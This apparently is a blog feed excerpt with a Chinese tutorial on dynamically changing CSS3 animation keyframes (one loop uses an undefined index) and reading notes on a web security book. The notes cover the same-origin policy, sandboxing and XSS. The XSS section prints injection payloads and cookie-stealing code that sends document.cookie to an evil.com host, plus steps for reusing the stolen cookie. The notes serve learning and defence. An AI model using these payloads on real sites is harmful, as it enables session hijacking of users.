    <link href="http://www.wanglinzhizhi.me/2017/01/21/javascript%E5%8A%A8%E6%80%81%E6%94%B9%E5%8F%98css3%E7%9A%84animation/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/javascript动态改变css3的animation/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-01-21T10:51:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="javascript动态改变css3的animation"><a href="#javascript动态改变css3的animation" class="headerlink" title="javascript动态改变css3的animation"></a><a href="http://www.shaynegui.com/javascript-changing-animation-keyframes/" target="_blank" rel="external">javascript动态改变css3的animation</a></h2><p>肖恩桂桂 a year ago</p>
<p>当需要在animation下动态计算keyframe水平或垂直方向的位移则比transition要麻烦许多,而且有诸多坑等着我们去踩.</p>
<h3 id="动态改变keyframe"><a href="#动态改变keyframe" class="headerlink" title="动态改变keyframe"></a>动态改变keyframe</h3><p>通过javascript动态改变animation的keyframe比较麻烦，造成此问题的原因也是受限于CSSOM的API,特别是定义了多个帧的frame时，js基本无法去在运行时动态改变,只能通过重写cssRule来实现</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">findKeyframesRule</span>(<span class="params">animName</span>) </span>&#123;</div><div class="line">      <span class="keyword">var</span> rule;</div><div class="line">      <span class="keyword">var</span> ss = <span class="built_in">document</span>.styleSheets;</div><div class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; ss.length; ++i) &#123;</div><div class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> x = <span class="number">0</span>; x &lt; ss[i].cssRules.length; ++x) &#123;</div><div class="line"></div><div class="line">              rule = ss[i].cssRules[x];</div><div class="line"></div><div class="line">              <span class="keyword">if</span> (rule.name == animName &amp;&amp; (rule.type== CSSRule.KEYFRAMES_RULE || ss[i].cssRules[j].type == CSSRule.WEBKIT_KEYFRAMES_RULE ))&#123;</div><div class="line">                  <span class="keyword">return</span> rule;</div><div class="line">              &#125;</div><div class="line">          &#125;</div><div class="line"></div><div class="line">      &#125;</div><div class="line"></div><div class="line">  &#125;</div><div class="line">  <span class="comment">//删除旧的动画添加新的</span></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">selector,animName</span>)</span></div><div class="line">    &#123;</div><div class="line"></div><div class="line">        <span class="keyword">var</span> keyframes = findKeyframesRule(animName);</div><div class="line"></div><div class="line">        <span class="comment">// 删除已经存在的开始和结束帧</span></div><div class="line">        keyframes.deleteRule(<span class="string">"0%"</span>);</div><div class="line">        keyframes.deleteRule(<span class="string">"100%"</span>);</div><div class="line">        <span class="keyword">var</span> clientWidth =  <span class="built_in">document</span>.documentElement.clientWidth/<span class="number">2</span> || <span class="built_in">document</span>.body.clientWidth/<span class="number">2</span> <span class="comment">//此处为举例</span></div><div class="line"></div><div class="line">        keyframes.insertRule(<span class="string">"0% &#123; -webkit-transform: translate("</span>+clientWidth+<span class="string">"px); &#125;"</span>);</div><div class="line">        keyframes.insertRule(<span class="string">"100% &#123; -webkit-transform: translate(-"</span>+clientWidth/<span class="number">2</span>+<span class="string">"px); &#125;"</span>);<span class="comment">//结束移动屏幕一半</span></div><div class="line"></div><div class="line">        <span class="comment">// 重新指定动画名字使之生效</span></div><div class="line">        <span class="built_in">document</span>.querySelector(selector).style.webkitAnimationName = animName;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>此段代码对于未跨域link引入的css是可以生效,但是对于跨域的css在chrome下findKeyframesRule会取不到cssRule,<code>ss[i].cssRules</code>会始终为null,原以为link标签加上crossorigin属性,然后css的response响应的header加上<strong>Access-Control-Allow-Origin: *</strong>会能取到值,可是chrome下依旧取不到,无奈谷歌到chromium的<a href="http://www.shaynegui.com/javascript-changing-animation-keyframes/chromium" target="_blank" rel="external">390947#issue</a>才知道原因,即使设置了header,chrome也可能不会让js动态操作跨域的css,无奈只能放弃此条道路</p>
<h2 id="重新插入新样式-覆盖旧样式"><a href="#重新插入新样式-覆盖旧样式" class="headerlink" title="重新插入新样式,覆盖旧样式"></a>重新插入新样式,覆盖旧样式</h2><p>css的规则是权重相同的情况下,后面的定义的会覆盖前面的,因此我们只能动态的插入相应的新cssRule达到覆盖的目的</p>
<figure class="highlight"><table><tr><td class="code"><pre><div class="line">function addStylesheetRules (rules) &#123;  </div><div class="line">  var styleEl = document.createElement('style'),</div><div class="line">      styleSheet;</div><div class="line">  document.head.appendChild(styleEl);</div><div class="line"></div><div class="line">  // 获取样式</div><div class="line">  styleSheet = styleEl.sheet;</div><div class="line">  // 插入样式</div><div class="line">  for(var i=0;i&lt;rules.length;i++)&#123;</div><div class="line">       styleSheet.insertRule(rules[i], styleSheet.cssRules.length);//后面一个参数表示插入位置的索引</div><div class="line">  &#125; </div><div class="line">&#125;</div><div class="line"></div><div class="line">addStylesheetRules(["body &#123; color: white &#125;","@-webkit-keyframes animName &#123;  </div><div class="line">    100% &#123;</div><div class="line">        -webkit-transform: translateX(-"+clientWidth/2"px);</div><div class="line">    &#125;</div><div class="line">&#125;"])</div></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>能用transtion过渡就不用animation</li>
<li>js操作animation的keyframe确实不是很方便,而且可能遭遇跨域问题,因此尽量能不用不用</li>
<li>如需要动态设置keyframe,建议动态构造新的style来覆盖旧的</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;javascript动态改变css3的animation&quot;&gt;&lt;a href=&quot;#javascript动态改变css3的animation&quot; class=&quot;headerlink&quot; title=&quot;javascript动态改变css3的animation&quot;&gt;&lt;/a&gt;&lt;a
    
    </summary>
    
      <category term="web" scheme="http://www.wanglinzhizhi.me/categories/web/"/>
    
    
      <category term="CSS3" scheme="http://www.wanglinzhizhi.me/tags/CSS3/"/>
    
      <category term="JS" scheme="http://www.wanglinzhizhi.me/tags/JS/"/>
    
      <category term="移动web" scheme="http://www.wanglinzhizhi.me/tags/%E7%A7%BB%E5%8A%A8web/"/>
    
      <category term="动画" scheme="http://www.wanglinzhizhi.me/tags/%E5%8A%A8%E7%94%BB/"/>
    
  </entry>
  
  <entry>
    <title>白帽子讲Web安全 读书笔记</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E5%AE%89%E5%85%A8%20%20%E5%90%B4%E7%BF%B0%E6%B8%85%20%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/白帽子讲Web安全  吴翰清 读书笔记/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-01-21T10:51:18.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="白帽子讲Web安全"><a href="#白帽子讲Web安全" class="headerlink" title="白帽子讲Web安全"></a>白帽子讲Web安全</h3><p>吴翰清</p>
<hr>

<h3 id="1-5-安全三要素"><a href="#1-5-安全三要素" class="headerlink" title="1.5 安全三要素"></a>1.5 安全三要素</h3><p>安全三要素是安全的基本组成元素，分别是机密性（Confidentiality）、完整性（Integrity）、可用性（Availability）。</p>
<p><hr></p>
<h3 id="1-6-4-设计安全方案"><a href="#1-6-4-设计安全方案" class="headerlink" title="1.6.4 设计安全方案"></a>1.6.4 设计安全方案</h3><p>很多人认为，安全和业务是冲突的，因为往往为了安全，要牺牲业务的一些易用性或者性能，笔者不太赞同这种观点。从产品的角度来说，安全也应该是产品的一种属性。</p>
<p>产品需求，尤其是商业需求，是用户真正想要的东西，是业务的意义所在，在设计安全方案时应该尽可能地不要改变商业需求的初衷。<br>注: 在设计安全方案时应尽可能地不要改变商业需求的初衷</p>
<p>每当系统里的软件有什么敏感动作时，UAC就会弹出来询问用户是否允许该行为。这个功能在Vista众多失败的原因中是被人诟病最多的一个。如果用户能够分辨什么样的行为是安全的，那么还要安全软件做什么？同样的问题出现在很多主动防御的桌面安全保护软件中，它们动辄弹出个对话框询问用户是否允许目标的行为，这是非常荒谬的用户体验。</p>
<p><hr></p>
<h3 id="1-7-1-Secure-By-Default原则"><a href="#1-7-1-Secure-By-Default原则" class="headerlink" title="1.7.1 Secure By Default原则"></a>1.7.1 <code>Secure By Default</code>原则</h3><p>这个规范的制定，也可以选择白名单的思想来实现。按照白名单的思想，应该根据业务需求，列出一个允许使用的软件以及软件版本的清单，在此清单外的软件则禁止使用。</p>
<p>通配符<code>*</code>，代表来自任意域的Flash都能访问本域的数据，因此就造成了安全隐患。所以在选择使用白名单时，需要注意避免出现类似通配符<code>*</code>的问题。</p>
<p>最小权限原则也是安全设计的基本原则之一。最小权限原则要求系统只授予主体必要的权限，而不要过度授权，这样能有效地减少系统、网络、应用、数据库出错的机会。</p>
<p><hr></p>
<h3 id="1-7-2-纵深防御原则"><a href="#1-7-2-纵深防御原则" class="headerlink" title="1.7.2 纵深防御原则"></a>1.7.2 纵深防御原则</h3><p>常见的入侵案例中，大多数是利用Web应用的漏洞，攻击者先获得一个低权限的webshell，然后通过低权限的webshell上传更多的文件，并尝试执行更高权限的系统命令，尝试在服务器上提升权限为root；接下来攻击者再进一步尝试渗透内网，比如数据库服务器所在的网段。</p>
<p>对于XSS防御，对系统取得的用户输入进行过滤其实是不太合适的，因为XSS真正产生危害的场景是在用户的浏览器上，或者说服务器端输出的HTML页面，被注入了恶意代码。只有在拼装HTML时输出，系统才能获得HTML上下文的语义，才能判断出是否存在误杀等情况。所以“在正确的地方做正确的事情”，也是纵深防御的一种含义——必须把防御方案放到最合适的地方去解决。（XSS防御的更多细节请参考“跨站脚本攻击”一章。</p>
<p><hr></p>
<h3 id="1-7-3-数据与代码分离原则"><a href="#1-7-3-数据与代码分离原则" class="headerlink" title="1.7.3 数据与代码分离原则"></a>1.7.3 数据与代码分离原则</h3><p>实际上，缓冲区溢出，也可以认为是程序违背了这一原则的后果——程序在栈或者堆中，将用户数据当做代码执行，混淆了代码与数据的边界，从而导致安全问题的发生。</p>
<p>在Web安全中，由“注入”引起的问题比比皆是，如XSS、SQL Injection、CRLF Injection、X-Path Injection等。此类问题均可以根据“数据与代码分离原则”设计出真正安全的解决方案，因为这个原则抓住了漏洞形成的本质原因。</p>
<p><hr></p>
<h3 id="1-7-4-不可预测性原则"><a href="#1-7-4-不可预测性原则" class="headerlink" title="1.7.4 不可预测性原则"></a>1.7.4 不可预测性原则</h3><p>微软的Windows系统用户多年来深受缓冲区溢出之苦，因此微软在Windows的新版本中增加了许多对抗缓冲区溢出等内存攻击的功能。微软无法要求运行在系统中的软件没有漏洞，因此它采取的做法是让漏洞的攻击方法失效。比如，使用DEP来保证堆栈不可执行，使用ASLR让进程的栈基址随机变化，从而使攻击程序无法准确地猜测到内存地址，大大提高了攻击的门槛。</p>
<p>在ASLR的控制下，一个程序每次启动时，其进程的栈基址都不相同，具有一定的随机性，对于攻击者来说，这就是“不可预测性”</p>
<hr>

<h3 id="2-1-同源策略"><a href="#2-1-同源策略" class="headerlink" title="2.1 同源策略"></a>2.1 同源策略</h3><p>同源策略（Same Origin Policy）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说Web是构建在同源策略的基础之上的，浏览器只是针对同源策略的一种实现。</p>
<p>浏览器的同源策略，限制了来自不同源的“document”或脚本，对当前“document”读取或设置某些属性。</p>
<p>这一策略极其重要，试想如果没有同源策略，可能a.com的一段JavaScript脚本，在b.com未曾加载此脚本时，也可以随意涂改b.com的页面（在浏览器的显示中）。为了不让浏览器的页面行为发生混乱，浏览器提出了“Origin”（源）这一概念，来自不同Origin的对象无法互相干扰</p>
<p>浏览器中JavaScript的同源策略（当JavaScript被浏览器认为来自不同源时，请求被拒绝）</p>
<p>影响“源”的因素有：host（域名或IP地址，如果是IP地址则看做一个根域名）、子域名、端口、协议。</p>
<p>需要注意的是，对于当前页面来说，页面内存放JavaScript文件的域并不重要，重要的是加载JavaScript页面所在的域是什么。</p>
<p>换言之，a.com通过以下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;script src=http://b.com/b.js &gt;&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>加载了b.com上的b.js，但是b.js是运行在a.com页面中的，因此对于当前打开的页面（a.com页面）来说，b.js的Origin就应该是a.com而非b.com。</p>
<p>在浏览器中，<code>&lt;script&gt;、&lt;img&gt;、&lt;iframe&gt;、&lt;link&gt;</code>等标签都可以跨域加载资源，而不受同源策略的限制。这些带“src”属性的标签每次加载时，实际上是由浏览器发起了一次GET请求。不同于XMLHttpRequest的是，通过src属性加载的资源，浏览器限制了JavaScript的权限，使其不能读、写返回的内容。</p>
<p>但XMLHttpRequest受到同源策略的约束，不能跨域访问资源，在AJAX应用的开发中尤其需要注意这一点。</p>
<p>如果XMLHttpRequest能够跨域访问资源，则可能会导致一些敏感数据泄露，比如CSRF的token，从而导致发生安全问题。</p>
<p>但是互联网是开放的，随着业务的发展，跨域请求的需求越来越迫切，因此W3C委员会制定了XMLHttpRequest跨域访问标准。它需要通过目标域返回的HTTP头来授权是否允许跨域访问，因为HTTP头对于JavaScript来说一般是无法控制的，所以认为这个方案可以实施。注意：这个跨域访问方案的安全基础就是信任“JavaScript无法控制该HTTP头”，如果此信任基础被打破，则此方案也将不再安全。</p>
<p>对于浏览器来说，除了DOM、Cookie、XMLHttpRequest会受到同源策略的限制外，浏览器加载的一些第三方插件也有各自的同源策略。最常见的一些插件如Flash、Java Applet、Silverlight、Google Gears等都有自己的控制策略。</p>
<p>以Flash为例，它主要通过目标网站提供的crossdomain.xml文件判断是否允许当前“源”的Flash跨域访问目标资源。<br>以www.qq.com的策略文件为例，当浏览器在任意其他域的页面里加载了Flash后，如果对www.qq.com发起访问请求，Flash会先检查www.qq.com上此策略文件是否存在。如果文件存在，则检查发起请求的域是否在许可范围内。</p>
<p>在这个策略文件中，只有来自<code>*.qq.com</code>和 <code>*.gtimg.com</code>域的请求是被允许的。依靠这种方式，从Origin的层面上控制了Flash行为的安全性。</p>
<p>浏览器的同源策略是浏览器安全的基础，在本书后续章节中提到的许多客户端脚本攻击，都需要遵守这一法则，因此理解同源策略对于客户端脚本攻击有着重要意义。同源策略一旦出现漏洞被绕过，也将带来非常严重的后果，很多基于同源策略制定的安全方案都将失去效果。</p>
<p><hr></p>
<h3 id="2-2-浏览器沙箱"><a href="#2-2-浏览器沙箱" class="headerlink" title="2.2 浏览器沙箱"></a>2.2 浏览器沙箱</h3><p>浏览器的多进程架构，将浏览器的各个功能模块分开，各个浏览器实例分开，当一个进程崩溃时，也不会影响到其他的进程。</p>
<p>Google Chrome是第一个采取多进程架构的浏览器。Google Chrome的主要进程分为：浏览器进程、渲染进程、插件进程、扩展进程。插件进程如flash、java、pdf等与浏览器进程严格隔离，因此不会互相影响。</p>
<p>渲染引擎由Sandbox隔离，网页代码要与浏览器内核进程通信、与操作系统通信都需要通过IPC channel，在其中会进行一些安全检查。</p>
<p>Sandbox即沙箱，计算机技术发展到今天，Sandbox已经成为泛指“资源隔离类模块”的代名词。Sandbox的设计目的一般是为了让不可信任的代码运行在一定的环境中，限制不可信任的代码访问隔离区之外的资源。如果一定要跨越Sandbox边界产生数据交换，则只能通过指定的数据通道，比如经过封装的API来完成，在这些API中会严格检查请求的合法性。</p>
<p>Sandbox的应用范围非常广泛。比如一个提供hosting服务的共享主机环境，假设支持用户上传PHP、Python、Java等语言的代码，为了防止用户代码破坏系统环境，或者是不同用户之间的代码互相影响，则应该设计一个Sandbox对用户代码进行隔离。Sandbox需要考虑用户代码针对本地文件系统、内存、数据库、网络的可能请求，可以采用默认拒绝的策略，对于有需要的请求，则可以通过封装API的方式实现。</p>
<p>Google Chrome实现了一个相对完整的Sandbox：</p>
<p>IE 8也采取了多进程架构，每一个Tab页即是一个进程</p>
<p>多进程架构最明显的一个好处是，相对于单进程浏览器，在发生崩溃时，多进程浏览器只会崩溃当前的Tab页，而单进程浏览器则会崩溃整个浏览器进程。</p>
<p>但是浏览器安全是一个整体，在现今的浏览器中，虽然有多进程架构和Sandbox的保护，但是浏览器所加载的一些第三方插件却往往不受Sandbox管辖。比如近年来在Pwn2Own大会上被攻克的浏览器，往往都是由于加载的第三方插件出现安全漏洞导致的。Flash、Java、PDF、.Net Framework在近年来都成为浏览器攻击的热点。</p>
<p>也许在不远的未来，在浏览器的安全模型中会更加重视这些第三方插件，不同厂商之间会就安全达成一致的标准，也只有这样，才能将这个互联网的入口打造得更加牢固</p>
<p><hr></p>
<h3 id="2-3-恶意网址拦截"><a href="#2-3-恶意网址拦截" class="headerlink" title="2.3 恶意网址拦截"></a>2.3 恶意网址拦截</h3><p>上节提到了“挂马”攻击方式能够破坏浏览器安全，在很多时候，“挂马”攻击在实施时会在一个正常的网页中通过<code>&lt;script&gt;</code>或者<code>&lt;iframe&gt;</code>等标签加载一个恶意网址。</p>
<p>为了保护用户安全，浏览器厂商纷纷推出了各自的拦截恶意网址功能。目前各个浏览器的拦截恶意网址的功能都是基于“黑名单”的。</p>
<p>恶意网址拦截的工作原理很简单，一般都是浏览器周期性地从服务器端获取一份最新的恶意网址黑名单，如果用户上网时访问的网址存在于此黑名单中，浏览器就会弹出一个警告页面。</p>
<p>常见的恶意网址分为两类：一类是挂马网站，这些网站通常包含有恶意的脚本如JavaScript或Flash，通过利用浏览器的漏洞（包括一些插件、控件漏洞）执行shellcode，在用户电脑中植入木马；另一类是钓鱼网站，通过模仿知名网站的相似页面来欺骗用户。<br>要识别这两种网站，需要建立许多基于页面特征的模型，而这些模型显然是不适合放在客户端的，因为这会让攻击者得以分析、研究并绕过这些规则。同时对于用户基数巨大的浏览器来说，收集用户访问过的历史记录也是一种侵犯隐私的行为，且数据量过于庞大。<br>基于这两个原因，浏览器厂商目前只是以推送恶意网址黑名单为主，浏览器收到黑名单后，对用户访问的黑名单进行拦截；而很少直接从浏览器收集数据，或者在客户端建立模型。现在的浏览器多是与专业的安全厂商展开合作，由安全厂商或机构提供恶意网址黑名单。</p>
<p>一些有实力的浏览器厂商，比如Google和微软，由于本身技术研发实力较强，且又掌握了大量的用户数据，因此自建有安全团队做恶意网址识别工作，用以提供浏览器所使用的黑名单。对于搜索引擎来说，这份黑名单也是其核心竞争力之一。</p>
<p>PhishTank是互联网上免费提供恶意网址黑名单的组织之一，它的黑名单由世界各地的志愿者提供，且更新频繁。</p>
<p>类似地，Google也公开了其内部使用的SafeBrowsing API，任何组织或个人都可以在产品中接入，以获取Google的恶意网址库。</p>
<p>除了恶意网址黑名单拦截功能外，主流浏览器都开始支持EV SSL证书（Extended Validation SSL Certificate），以增强对安全网站的识别。<br>EVSSL证书是全球数字证书颁发机构与浏览器厂商一起打造的增强型证书，其主要特色是浏览器会给予EVSSL证书特殊待遇。EVSSL证书也遵循X509标准，并向前兼容普通证书。如果浏览器不支持EV模式，则会把该证书当做普通证书；如果浏览器支持（需要较新版本的浏览器）EV模式，则会在地址栏中特别标注。</p>
<p><hr></p>
<h3 id="2-4-高速发展的浏览器安全"><a href="#2-4-高速发展的浏览器安全" class="headerlink" title="2.4 高速发展的浏览器安全"></a>2.4 高速发展的浏览器安全</h3><p>浏览器安全”领域涵盖的范围非常大，且今天浏览器仍然在不断更新，不断推出新的安全功能。<br>为了在安全领域获得竞争力，微软率先在IE 8中推出了XSS Filter功能，用以对抗反射型XSS。一直以来，XSS（跨站脚本攻击）都被认为是服务器端应用的漏洞，应该由服务器端应用在代码中修补，而微软率先推出了这一功能，就使得IE 8在安全领域极具特色。</p>
<p>当用户访问的URL中包含了XSS攻击的脚本时，IE就会修改其中的关键字符使得攻击无法成功完成，并对用户弹出提示框。</p>
<p>这些规则可以捕获URL中的XSS攻击，其他的安全产品可以借鉴。</p>
<p>而Firefox也不甘其后，在Firefox 4中推出了Content Security Policy（CSP）。这一策略是由安全专家Robert Hanson最早提出的，其做法是由服务器端返回一个HTTP头，并在其中描述页面应该遵守的安全策略。</p>
<p>由于XSS攻击在没有第三方插件帮助的情况下，无法控制HTTP头，所以这项措施是可行的。</p>
<p>使用CSP的方法如下，插入一个HTTP返回头：</p>
<p><code>X-Content-Security-Policy: policy</code></p>
<p>其中policy的描述极其灵活，比如：</p>
<p>CSP的设计理念无疑是出色的，但是CSP的规则配置较为复杂，在页面较多的情况下，很难一个个配置起来，且后期维护成本也非常巨大，这些原因导致CSP未能得到很好的推广。</p>
<p>比如，浏览器地址栏对于畸形URL的处理就各自不同。在IE中，如下URL将被正常解析：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">www.google.com\abc</div></pre></td></tr></table></figure>
<p>会变为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">www.google.com/abc</div></pre></td></tr></table></figure>
<p>具有同样行为的还有Chrome，将“\”变为标准的“/”。</p>
<p>但是Firefox却不如此解析，www.google.com\abc将被认为是非法的地址，无法打开。</p>
<p>扩展和插件的权限都高于页面JavaScript的权限，比如可以进行一些跨域网络请求等。</p>
<p>在插件中，也曾经出现过一些具有恶意功能的程序，比如代号为Trojan.PWS.ChromeInject.A的恶意插件，其目标是窃取网银密码</p>
<p><hr></p>
<h3 id="2-5-小结"><a href="#2-5-小结" class="headerlink" title="2.5 小结"></a>2.5 小结</h3><p>浏览器是互联网的重要入口，在安全攻防中，浏览器的作用也越来越被人们所重视。在以往研究攻防时，大家更重视的是服务器端漏洞；而在现在，安全研究的范围已经涵盖了所有用户使用互联网的方式，浏览器正是其中最为重要的一个部分。</p>
<p>浏览器的安全以同源策略为基础，加深理解同源策略，才能把握住浏览器安全的本质。在当前浏览器高速发展的形势下，恶意网址检测、插件安全等问题都会显得越来越重要。紧跟浏览器发展的脚步来研究浏览器安全，是安全研究者需要认真对待的事情。</p>
<p><hr></p>
<h3 id="第3章-跨站脚本攻击（XSS）"><a href="#第3章-跨站脚本攻击（XSS）" class="headerlink" title="第3章　跨站脚本攻击（XSS）"></a>第3章　跨站脚本攻击（XSS）</h3><p>跨站脚本攻击（XSS）是客户端脚本安全中的头号大敌。OWASP TOP 10威胁多次把XSS列在榜首。本章将深入探讨XSS攻击的原理，以及如何正确地防御它。</p>
<p><hr></p>
<h3 id="3-1-XSS简介"><a href="#3-1-XSS简介" class="headerlink" title="3.1 XSS简介"></a>3.1 XSS简介</h3><p>XSS攻击，通常指黑客通过“HTML注入”篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。在一开始，这种攻击的演示案例是跨域的，所以叫做“跨站脚本”。但是发展到今天，由于JavaScript的强大功能以及网站前端应用的复杂化，是否跨域已经不再重要。</p>
<p>XSS长期以来被列为客户端Web安全中的头号大敌。因为XSS破坏力强大，且产生的场景复杂，难以一次性解决。现在业内达成的共识是：针对各种不同场景产生的XSS，需要区分情景对待。即便如此，复杂的应用环境仍然是XSS滋生的温床。</p>
<p>XSS根据效果的不同可以分成如下几类。</p>
<p>第一种类型：<code>反射型XSS</code></p>
<p>反射型XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说，黑客往往需要诱使用户“点击”一个恶意链接，才能攻击成功。反射型XSS也叫做“非持久型XSS”（Non-persistent XSS）。</p>
<p>第二种类型：存储型XSS</p>
<p>存储型XSS会把用户输入的数据“存储”在服务器端。这种XSS具有很强的稳定性。<br>比较常见的一个场景就是，黑客写下一篇包含有恶意JavaScript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码。黑客把恶意的脚本保存到服务器端，所以这种XSS攻击就叫做“存储型XSS”。<br>存储型XSS通常也叫做“持久型XSS”(Persistent XSS)，因为从效果上来说，它存在的时间是比较长的。</p>
<p>第三种类型：DOM Based XSS</p>
<p>实际上，这种类型的XSS并非按照“数据是否保存在服务器端”来划分，DOM Based XSS从效果上来说也是反射型XSS。单独划分出来，是因为DOM Based XSS的形成原因比较特别，发现它的安全专家专门提出了这种类型的XSS。出于历史原因，也就把它单独作为一个分类了。<br>通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。</p>
<p>看如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line"></div><div class="line">function test()&#123;</div><div class="line">  var str = document.getElementById(&quot;text&quot;).value;</div><div class="line">  document.getElementById(&quot;t&quot;).innerHTML = &quot;&lt;a href=&apos;&quot;+str+&quot;&apos; &gt;testLink&lt;/a&gt;&quot;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">&lt;/script&gt;</div><div class="line"></div><div class="line">&lt;div id=&quot;t&quot; &gt;&lt;/div&gt;</div><div class="line">&lt;input type=&quot;text&quot; id=&quot;text&quot; value=&quot;&quot; /&gt;</div><div class="line">&lt;input type=&quot;button&quot; id=&quot;s&quot; value=&quot;write&quot; onclick=&quot;test()&quot; /&gt;</div></pre></td></tr></table></figure>
<p>点击“write”按钮后，会在当前页面插入一个超链接，其地址为文本框的内容：<br>在这里，“write”按钮的onclick事件调用了test()函数。而在test()函数中，修改了页面的DOM节点，通过innerHTML把一段用户数据当做HTML写入到页面中，这就造成了DOM based XSS。</p>
<p>构造如下数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&apos; onclick=alert(/xss/) //</div></pre></td></tr></table></figure>
<p>输入后，页面代码就变成了：<code>&lt;a  href=&#39;&#39; onlick=alert(/xss/)//&#39; &gt;testLink&lt;/a&gt;</code></p>
<p>首先用一个单引号闭合掉<code>href</code>的第一个单引号，然后插入一个<code>onclick</code>事件，最后再用注释符“//”注释掉第二个单引号。</p>
<p>实际上，这里还有另外一种利用方式——除了构造一个新事件外，还可以选择闭合掉<code>&lt;a&gt;</code>标签，并插入一个新的HTML标签。尝试如下输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&apos;&gt;&lt;img src=# onerror=alert(/xss2/) /&gt;&lt;&apos;</div><div class="line">页面代码变成了：</div><div class="line">&lt;a href=&apos;&apos;&gt;&lt;img src=# onerror=alert(/xss2/) /&gt;&lt;&apos;&apos; &gt;testLink&lt;/a&gt;</div><div class="line">脚本被执行：</div></pre></td></tr></table></figure>
<p><hr></p>
<h3 id="3-2-1-初探XSS-Payload"><a href="#3-2-1-初探XSS-Payload" class="headerlink" title="3.2.1 初探XSS Payload"></a>3.2.1 初探XSS Payload</h3><p>XSS攻击成功后，攻击者能够对用户当前浏览的页面植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些用以完成各种具体功能的恶意脚本，被称为“XSS Payload”。</p>
<p><code>XSS Payload</code>实际上就是JavaScript脚本（还可以是Flash或其他富客户端的脚本），所以任何JavaScript脚本能实现的功能，<code>XSS Payload</code>都能做到。<br>一个最常见的<code>XSS Payload</code>，就是通过读取浏览器的Cookie对象，从而发起“Cookie劫持”攻击。<br>Cookie中一般加密保存了当前用户的登录凭证。Cookie如果丢失，往往意味着用户的登录凭证丢失。换句话说，攻击者可以不通过密码，而直接登录进用户的账户。</p>
<p>攻击者先加载一个远程脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://www.a.com/test.htm?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js &gt;&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>真正的XSS Payload写在这个远程脚本中，避免直接在URL的参数里写入大量的JavaScript代码。</p>
<p>在evil.js中，可以通过如下代码窃取Cookie：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">var img = document.createElement(&quot;img&quot;);</div><div class="line">img.src = &quot;http://www.evil.com/log?&quot;+escape(document.cookie);</div><div class="line">document.body.appendChild(img);</div></pre></td></tr></table></figure>
<p>这段代码在页面中插入了一张看不见的图片，同时把document.cookie对象作为参数发送到远程服务器。<br>事实上，<code>http://www.evil.com/log</code>并不一定要存在，因为这个请求会在远程服务器的Web日志中留下记录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">127.0.0.1 - - [19/Jul/2010:11:30:42 +0800] &quot;GET /log?cookie1%3D1234 HTTP/1.1&quot; 404 288</div></pre></td></tr></table></figure>
<p>这样，就完成了一个最简单的窃取Cookie的<code>XSS Payload</code>。<br>如何利用窃取的Cookie登录目标用户的账户呢？这和“利用自定义Cookie访问网站”的过程是一样的，参考如下过程。</p>
<p>在Firefox中访问用户的百度空间，登录后查看当前的Cookie：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">查看当前页面的Cookie值</div><div class="line">然后打开IE，访问同一个页面。此时在IE中，用户是未登录状态：</div><div class="line">用户处于未登录状态</div><div class="line">将Firefox中登录后的Cookie记录下来，并以之替换当前IE中的Cookie。重新发送这个包：使用同一Cookie值重新发包</div><div class="line">通过返回的页面可以看到，此时已经登录进该账户：返回登录后的状态页面</div><div class="line">验证一下，把返回的HTML代码复制到本地打开后，可以看到右上角显示了账户信息相关的数据：</div><div class="line">返回页面是已登录状态</div></pre></td></tr></table></figure>
<p>所以，通过XSS攻击，可以完成“Cookie劫持”攻击，直接登录进用户的账户。</p>
<p>这是因为在当前的Web中，Cookie一般是用户登录的凭证，浏览器发起的所有请求都会自动带上Cookie。如果Cookie没有绑定客户端信息，当攻击者窃取了Cookie后，就可以不用密码登录进用户的账户。</p>
<p>Cookie的“HttpOnly”标识可以防止“Cookie劫持”</p>
<p><hr></p>
